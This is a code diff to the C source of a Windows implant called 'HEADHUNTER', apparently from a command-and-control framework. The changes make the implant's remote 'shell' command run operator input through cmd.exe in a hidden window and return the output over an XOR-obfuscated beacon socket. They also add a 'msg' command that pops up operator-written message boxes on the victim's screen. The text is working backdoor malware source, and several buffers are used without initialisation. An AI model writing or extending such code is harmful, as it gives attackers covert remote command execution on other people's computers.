@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <tchar.h>
 #include "helpers.c"
 #include "payload_common.h"
 
@@ -19,6 +20,18 @@ char buf[MAXBUF];
 int bufsize;
 int beaconing;
 int sleeptime = 20000;
+
+DWORD WINAPI Msg(LPVOID lpParameter)
+{
+	LPCWSTR myText = *(LPCWSTR *)lpParameter;
+
+    	LPCWSTR myCaption = L"Important Message";
+
+    	MessageBoxW(NULL, myText, myCaption, MB_OKCANCEL);
+	
+	return 0;
+}
+
 
 int main(void) {
 
@@ -52,7 +65,6 @@ int main(void) {
 	}
 #endif
 
-
 	char* beacon = "--HEADHUNTER BEACON--";
 	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
         	
@@ -61,9 +73,9 @@ int main(void) {
 		
 		send(sock, xorbeacon, strlen(beacon), 0);
 		n = recv(sock, buf, MAXBUF, 0);
-
 		char* xorbuf = XOR(buf, key, n, keylen);
-
+		xorbuf[n] = '\0';
+		
 		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
 			Sleep(sleeptime);
 		}
@@ -74,32 +86,71 @@ int main(void) {
 				
 			if(str_starts_with(xorbuf, "shell") == 0)
 			{
-				char* cmd = split(xorbuf, " ");
-				FILE* fp;
-				char* terminated;
-				fp = _popen(cmd, "r");
-				if(fp == NULL) {
-				    char* error = "Failed to run command\n";
-				    char* xorerror = XOR(error, key, strlen(error), keylen);
-				    send(sock, xorerror, strlen(error), 0);
-				    free(xorerror);
-						    
-				}
+		
+				SECURITY_ATTRIBUTES saAttr;
+    				saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    				saAttr.bInheritHandle = TRUE;
+    				saAttr.lpSecurityDescriptor = NULL;
 
-				char path[2050];
-				char command[12000];
-				char* reset = "\n";
-				while (fgets(path, sizeof(path), fp) != NULL) {
-					strncat(command, path, strlen(path));
-				}
+    				HANDLE hOutputRead, hOutputWrite;
 
-				strncat(command, reset, strlen(reset));
-				char* xordata = XOR(command, key, strlen(command), keylen);
-				send(sock, xordata, strlen(command), 0);
-				//free(xornewline);
-				free(xordata);
+    				if (!CreatePipe(&hOutputRead, &hOutputWrite, &saAttr, 0)) {
+        				// Handle error
+        				return 1;
+				 }
+
+    				STARTUPINFO si;
+    				PROCESS_INFORMATION pi;
+
+    				ZeroMemory(&si, sizeof(STARTUPINFO));
+    				si.cb = sizeof(STARTUPINFO);
+    				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    				si.wShowWindow = SW_HIDE; // Hide the cmd window
+
+    				si.hStdError = hOutputWrite;
+    				si.hStdOutput = hOutputWrite;
+
+		
+				char command[12000]; // Buffer to cat multiline output into	
 				memset(command, '\0', strlen(command));
 
+				char* argsop = split(xorbuf, " ");
+				
+				// Cat operator supplied command onto command prefix
+				char args[4096];
+				char* argprefix = " /C ";
+				char* reset = "\n";
+				strncat(args, argprefix, strlen(argprefix));
+				strncat(args, argsop, strlen(argsop));
+				if (CreateProcess("C:\\Windows\\System32\\cmd.exe", args, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        				CloseHandle(hOutputWrite);
+
+       		 			char buffer[4096];
+        				DWORD bytesRead;
+
+        				while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
+            					
+            					strcat(command, buffer);
+						memset(buffer, '\0', strlen(buffer));
+        				}
+				
+					strcat(command, reset);
+
+					char* xordata = XOR(command, key, strlen(command), keylen);
+					send(sock, xordata, strlen(command), 0);
+					free(xordata);
+					memset(command, '\0', strlen(command));
+					memset(buffer, '\0', strlen(buffer));
+					memset(args, '\0', strlen(args));
+
+				}	
+				else{
+					char* error = "\e[1;31m[-]\e[0m Failed to run command\n";
+					char* xorerror = XOR(error, key, strlen(error), keylen);
+					send(sock, xorerror, strlen(error), 0);
+					free(xorerror);
+						    
+				}
 			}
 			else if(str_starts_with(xorbuf, "sleep") == 0){
 				char* cmd = split(xorbuf, " ");
@@ -108,6 +159,23 @@ int main(void) {
                                 char* xorsleepmsg = XOR(sleepmsg, key, strlen(sleepmsg), keylen);
 				send(sock, xorsleepmsg, strlen(sleepmsg), 0);
 				free(xorsleepmsg);
+			}
+			else if(str_starts_with(xorbuf, "msg") == 0){
+				
+				char* cmd = split(xorbuf, " ");
+				// convert char* to LPWSTR
+ 				wchar_t wtext[1000];
+ 				mbstowcs(wtext, cmd, strlen(cmd)+1);//Plus null
+				wtext[strlen(cmd)+1] = '\0';
+ 				LPWSTR msg = wtext;
+				
+				DWORD myThreadID;
+				HANDLE myHandle = CreateThread(0, 0, Msg, &msg, 0, &myThreadID);
+				char* msgmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
+                                char* xormsgmsg = XOR(msgmsg, key, strlen(msgmsg), keylen);
+				send(sock, xormsgmsg, strlen(msgmsg), 0);
+				free(xormsgmsg);
+
 			}
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
